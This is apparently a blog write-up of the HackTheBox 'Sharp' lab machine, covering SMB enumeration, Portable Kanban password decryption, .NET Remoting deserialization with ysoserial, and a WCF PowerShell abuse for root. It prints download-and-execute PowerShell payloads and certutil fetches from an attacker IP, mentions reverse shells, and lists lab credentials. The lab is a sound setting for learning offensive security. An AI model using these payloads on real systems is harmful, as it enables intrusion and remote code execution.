---

title: Sharp HackTheBox Writeup
author: Software User 
date: 2021-05-24 16:31:00 +0800
category: hackthebox
tags: [htb-machines, htb, sharp,portable-kanban,kanban,reversing,exploit-remoting-service]

--- 

![Desktop View]({{ "/assets/img/htb-machines/sharp/sharp.png" | relative_url }})

---

<strong><span style="color:#ff5555">Introduction</span></strong>


Sharp machine released on 05 December 2020 on HackTheBox and created by [cube0x0](https://app.hackthebox.eu/users/9164)


<span style="color:#ff5555">The blog is for educational purposes only.</span>

--- 

<strong ><span style="color:#ff5555">Enumeration</span></strong>

<strong><span style="color:#ff5555">IP :- 10.10.10.219</span></strong>

As always, I added IP In hosts file.

--- 

<p><code class="language-plaintext highlighter-rouge">softwareuser@parrot:~ sudo 
nmap -sC -sV -oN nmap/intial_scan sharp.htb </code></p>


<strong>-sC for default scripts</strong><br>
<strong>-sV for Version detection</strong><br>
<strong>-oN for Output</strong><br>

lnmap is just my alias to print only open ports from result file
## Nmap

```bash
# Nmap 7.91 scan initiated Sun May
09:21:37 2021 as: nmap -sC -sV -oN
nmap/intial_scan sharp.htb
Nmap scan report for sharp.htb ( 10.10 .10.219 )
Host is up ( 0 .30s latency) .
Not shown: 996 filtered ports
PORT STATE SERVICE VERSION
135 /tcp open msrpc Microsoft
netbios-ssn Microsoft
Windows RPC
139 /tcp
open
Windows netbios-ssn
445 /tcp
open
8888 /tcp open
microsoft-ds?
storagecraft-image
StorageCraft Image Manager
Service Info: OS: Windows; CPE:
cpe:/o:microsoft:windowsp
/
Host script results:
| _clock-skew: -7h49m04s
| smb2-security-mode:
|
| _
2.02 :
Message signing enabled but not
required
| smb2-time:
| date: 2021 -05-08T20:04:04
| _ start_date: N/A
Service detection performed. Please report
any incorrect results at
https://nmap.org/submit/ .
# Nmap done at Sun May
9 09:23:46 2021 -- 1
IP address (1 host up) scanned in 129.03
seconds

```

**Open Ports**
```
135/tcp open msrpc Microsoft Windows RPC
139/tcp open netbios-ssn Microsoft Windows
netbios-ssn
445/tcp open microsoft-ds?8888/tcp open storagecraft-image StorageCraft
Image Manager
```
8888 Port wasn't responding! 

Let's focus on Smb First
## Smbclient

Let's check with smbclient 

```bash 
smbclient -L //sharp.htb/ -N 
```
![Desktop View]({{ "/assets/img/htb-machines/sharp/1.png" | relative_url }})

Four shares are available. Lets check if we have permission to read them
i will use smbmap

**So, what is smbmap?**
SMBMap allows users to enumerate samba share drives across an entire domain. List share drives, drive permissions, share contents, upload/download functionality, file name auto-download pattern matching, and even execute remote commands. This tool was designed with pen testing in mind, and is intended to simplify searching for potentially sensitive data across large networks. Read more about smbmap [here](https://github.com/ShawnDEvans/smbmap)

```bash
smbmap -H sharp.htb
```
![Desktop View]({{ "/assets/img/htb-machines/sharp/2.png" | relative_url }})

we have access to kanban. We can list the directories Recursively by Using -R (Recursively list dirs,and files) option 

```sh
smbmap -H sharp.htb -R
```
![Desktop View]({{ "/assets/img/htb-machines/sharp/3.png" | relative_url }})

Let's download these files
we, can download using smget read more about it [here](https://www.samba.org/samba/docs/current/man-html/smbget.1.html)


```sh
smbget -R smb://sharp.htb/kanban
```
After downloading files

![Desktop View]({{ "/assets/img/htb-machines/sharp/4.png" | relative_url }})

Most of them are dlls and some are .pk also there is pdf available after reading bit of pdf i was sure that box is about kanban.

*About Kanban : You can use this page to download
the Portable Kanban task management tool
developed by Dmitry Ivanov and originally available
on his personal page http://dmitryivanov.net (link
updated, as it looks like Dmitry’s website is down)
The download link below is shared with permission
from Dmitry himself. [Link](https://edgars.lazdini.lv/portable-kanban/#:~:text=Portable%20Kanban%20is%20a%20completely,%2C%20add%20custom%20fields%2C%20etc.)*

Let's check these .pk files

![Desktop View]({{ "/assets/img/htb-machines/sharp/5.png" | relative_url }})

This output looks like json let's try to beautfy it

![Desktop View]({{ "/assets/img/htb-machines/sharp/6.png" | relative_url }})

yeah, it's json i found some encrypted passwords in it.

![Desktop View]({{ "/assets/img/htb-machines/sharp/7.png" | relative_url }})

```md
Administrator : k+iUoOvQYG98PuhhRC7/rg==
lars: Ua3LyPFM175GN8D3+tqwLA==
```
At this time i was looking for "How to Decrypt this password?".
So, let's look for Kanban Exploits because, kanban is present in box
this one looks intresting [link](https://www.exploit-db.com/exploits/49409)
I decrypted the passwords using the script. 
![Desktop View]({{ "/assets/img/htb-machines/sharp/8.png" | relative_url }})
Decrypted passwords
```txt
Administrator: G2@$btRSHJYTarg
lars: G123HHrth234gRG
```
Lets also check the source code of this script. In this whole script two keys are used

```python
def decode(hash):
	hash = base64.b64decode(hash.encode('utf-8'))
	key = DesKey(b"7ly6UznJ")
	return key.decrypt(hash,initial=b"XuVUm5fR",padding=True).decode('utf-8')
```

At this point i thought maybe this keys are default and stored somewhere in kanban and i was trying to find the these bothkeys. so, i decided to reverse it
also, we got binary of kanban through smb. Lets check binary in windows vm 

Lets transfer the binary first. I can easily send it to vm using smbserver 

```bash
sudo python3smbserver.py transfer /your-path -smb2support
```
## Windows Vm 

In windows vm 
![Desktop View]({{ "/assets/img/htb-machines/sharp/9.png" | relative_url }})

copy all files 

I use Dnspy for reversing binaries. [dnspy](https://github.com/dnSpy/dnSpy)

Their are lot of functions in binary but i filtered some functions with  strings like ' pass' and 'password'.

**Functions :**
![Desktop View]({{ "/assets/img/htb-machines/sharp/10.png" | relative_url }})

*DbPassword:*

![Desktop View]({{ "/assets/img/htb-machines/sharp/11.png" | relative_url }})

*DbPassword2:*

![Desktop View]({{ "/assets/img/htb-machines/sharp/12.png" | relative_url }})

In Crypto.Encrypt i found keys(iv and key)!

![Desktop View]({{ "/assets/img/htb-machines/sharp/13.png" | relative_url }})

```cs
}
// Token: 0x04000001 RID: 1
private static byte [ ] _rgbKey = Encoding.ASCII.GetBytes( "7ly6UznJ");
// Token: 0x04000002 RID: 2
private static byte [ ] _rgbIV = Encoding.ASCII.GetBytes("XuVUm5fR");
}
```
So finally i got keys but already i ve decrypted it
using that script

Lets run kanban binary now 

![Desktop View]({{ "/assets/img/htb-machines/sharp/14.png" | relative_url }}})

i can login with those admin creds sucessfully got logged in settings → users hide password i got the same passwords which i've got using that script

![Desktop View]({{ "/assets/img/htb-machines/sharp/15.png" | relative_url }})

also, i have watched ippsec's video. There is also config file malupanation in kanban to get access of kanban you can watch it here [video](https://www.youtube.com/watch?v=lxjAZELJ96Q&t=885s) so, now i ve usernames and passwords lets try to login with smb on both users.

**lars has access to two shares:**

![Desktop View]({{ "/assets/img/htb-machines/sharp/16.png" | relative_url }})

# lars Smb

dev share has some files in it

![Desktop View]({{ "/assets/img/htb-machines/sharp/17.png" | relative_url }})

Lets download them 

![Desktop View]({{ "/assets/img/htb-machines/sharp/18.png" | relative_url }})

Let's check files now 

*notes.txt:*
![Desktop View]({{ "/assets/img/htb-machines/sharp/19.png" | relative_url }})

**That's a windows executable i have to transfer it in windows vm**
checking server in dnspy 
*Server:-*

![Desktop View]({{ "/assets/img/htb-machines/sharp/20.png" | relative_url }})

i noticed some things here:

```cs
using System.Runtime.Remoting;
using System.Runtime.Remoting.Channels;
using System.Runtime.Remoting.Channels.Tcp;

```
I kept it in my mind i looked for something else
`StartSever()`

![Desktop View]({{ "/assets/img/htb-machines/sharp/21.png" | relative_url }})

okay so their is a port which is used by app. 


```cs
( ( IDictionary ) hashtable ) [ "port" ] = 8888
```

*Client*

![Desktop View]({{ "/assets/img/htb-machines/sharp/22.png" | relative_url }})

their is also an endpoint 

```md
username and password
user = debug
password = SharpApplicationDebugUserPassword123!
```

Lets also check what if Runtime remoting

````md
System.Runtime.Remoting.Channels Namespace
Contains classes that support and handle
channels and channel sinks, which are used as
the transport medium when a client calls a
method on a remote object.

````
read about it [here](https://docs.microsoft.com/en-us/dotnet/api/system.runtime.remoting.channels?view=netframework-4.8)

Also, I found some articles on .net Remoting.
**NET Remoting is a framework where you can
invoke or consume methods or objects in a remote
computer named the server from your computer, the
client. We can also perform asynchronous calls in
.NET Remoting using callback delegates. These are
the advanced concepts from DCOM, COM, and so
on. read more about it [here](https://www.c-sharpcorner.com/UploadFile/d6707e/what-is-net-remoting-exactly609/)

Exploit code [link](https://github.com/tyranid/ExploitRemotingServic)
Some articles on it [first](https://labs.f-secure.com/advisories/milestone-xprotect-net-deserialization-vulnerability/) and [second](https://research.nccgroup.com/2019/03/19/finding-and-exploiting-net-remoting-over-http-using-deserialisation/)
<br>
Let's start exploitation

## Shell as lars

Download the openvpn binary in windows and run your
openvpn file. Also i'll download visual studio to compile exploit

Lets clone the [repo](https://github.com/tyranid/ExploitRemotingService) first.

Now open it in Visual Studio 

Look for csproj file in it and right click on it and build it

![Desktop View]({{ "/assets/img/htb-machines/sharp/23.png" | relative_url }})

building this binary was not an easy task you have to download package [here](https://www.nuget.org/packages/NDesk.Options/) and update your package manager path where you have downloaded then
build it i'll also try to upload it to my github

Build it 
![Desktop View]({{ "/assets/img/htb-machines/sharp/24.png" | relative_url }})

Also, ysoserial is needed download the compiled version for windows

Lets generate payload first I'll try to ping my own system to check if the binary is working or not. 

**Payload**
```cmd
λ ysoserial.exe -f BinaryFormatter -o base64
-g TypeConfuseDelegate -c "ping -n 5 10.10.14.156"

```
![Desktop View]({{ "/assets/img/htb-machines/sharp/25.png" | relative_url }})

run the compiled binary

```cmd

.\ExploitRemotingService.exe -s
tcp://10.10.10.219:8888/SecretSharpDebugApplicat
--user=debug --pass="SharpApplicationDebugUserPassword123!" -s tcp://10.10.10.219:8888/SecretSharpDebugApplicat
raw ##Output of ysoserial

```

Everything is mentioned in articles 

I got some response in wireshark

![Desktop View]({{ "/assets/img/htb-machines/sharp/26.png" | relative_url }})

Now i can put reverse shell in it ysoserial payload. I will use Nishang reverse shell download it. [link](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1)

Lets use this payload to deliver and execute our shell
start netcat listener and python server payload to execute and download shell [link](https://book.hacktricks.xyz/windows/basic-powershell-for-pentesters)

Let's generate payload for shell 
```cmd
λ
ysoserial.exe -f BinaryFormatter -o base64 -g TypeConfuseDelegate -c "powershell IEX(New-ObjectNet.WebClient).downloadString('http://yourip:80/shell-name.ps1')"

```

start nc listener now

![Desktop View]({{ "/assets/img/htb-machines/sharp/27.png"  | relative_url }})

start python server too

![Desktop View]({{ "/assets/img/htb-machines/sharp/28.png" |realtive_url }})

run the compiled binary

![Desktop View]({{ "/assets/img/htb-machines/sharp/29.png" | relative_url }})

Ignore the errors. After some seconds, i got shell as lars and also completed user part

### user.txt

![Desktop View]({{ "/assets/img/htb-machines/sharp/30.png" | relative_url }})

Lets enumerate for root now

## Root

found another binary in Documents folder

![Desktop View]({{ "/assets/img/htb-machines/sharp/31.png" | relative_url }})

Windows Communication Foundation here
lets copy it to our system there are lot of files lets compress it first


```cmd
Compress-Archive -Path C:\Users\lars\Documents\wcf -DestinationPath C:\Users\lars\Documents\wcf . zip
```
read about compress archive [here](https://blog.netwrix.com/2018/11/06/using-powershell-to-create-zip-archives-and-unzip-files/)
lets transfer it to dev share as lars has access to it

```cmd

PS C:\Users\lars\Documents> Move-Item -Path
C:\Users\lars\Documents\wcf.zip -Destination C:\dev

```
![Desktop View]({{ "/assets/img/htb-machines/sharp/32.png" | relative_url }})

Download it now

![Desktop View]({{ "/assets/img/htb-machines/sharp/33.png" | relative_url }})

we have sln file lets open it using visual studio

**Client:**
it's using 8889 port to communicate.

![Desktop View]({{ "/assets/img/htb-machines/sharp/34.png" | relative_url }})

also there is invokepowershell method looks intresting	
![Desktop View]({{ "/assets/img/htb-machines/sharp/35.png" | relative_url }})

i can add reverse shell in it and i can run it using invokepowershell  in client main method

```cs
// reverse shell
Console.WriteLine(client.InvokePowerShell("IEX(New-Object Net.WebClient).downloadString('http://10.10.14.156:80/rootshell.ps1')"));
```

**Shell**
![Desktop View]({{ "/assets/img/htb-machines/sharp/36.png" | relative_url}})

let's build it
![Desktop View]({{ "/assets/img/htb-machines/sharp/37.png" | relative_url }})

now i have to send wcfclient.exe to lars but i cant send it through file-explorer

we can use this windows utility [link](https://www.hackingarticles.in/file-transfer-cheatsheet-windows-and-linux/) start python server at port 80

```powershell
PS C:\dev> certutil -urlcache -split -f http://10.10.14.156:80/WcfRemotingLibrary.dll WcfRemotingLibrary.dll
****  Online  ****
  0000  ...
  1e00
CertUtil: -URLCache command completed successfully.
PS C:\dev> certutil -urlcache -split -f http://10.10.14.156:80/WcfClient.exe  WcfClient.exe
****  Online  ****
  0000  ...
  1600
CertUtil: -URLCache command completed successfully.

```
lets move it to documents folder

```ps
Move-Item -Path WcfRemotingLibrary.dll -Destination C:\Users\lars\Documents

Move-Item -Path WcfClient.exe -Destination C:\Users\lars\Documents

```
then start your netcat listener

![Desktop View]({{ "/assets/img/htb-machines/sharp/38.png" | relative_url }})
<br>
python server

![Desktop View]({{ "/assets/img/htb-machines/sharp/39.png" | relative_url }})

lets run wcfclient now
<br>
![Desktop View]({{ "/assets/img/htb-machines/sharp/40.png" | relative_url }})

Response at python server

![Desktop View]({{ "/assets/img/htb-machines/sharp/41.png" | relative_url }})

I got shell

![Desktop View]({{ "/assets/img/htb-machines/sharp/42.png" | relative_url }})

root.txt

![Desktop View]({{ "/assets/img/htb-machines/sharp/43.png" | relative_url }})

Thank you for reading my blog if you have any suggestions feel free to contact me on [twitter](https://twitter.com/softwareuser_).

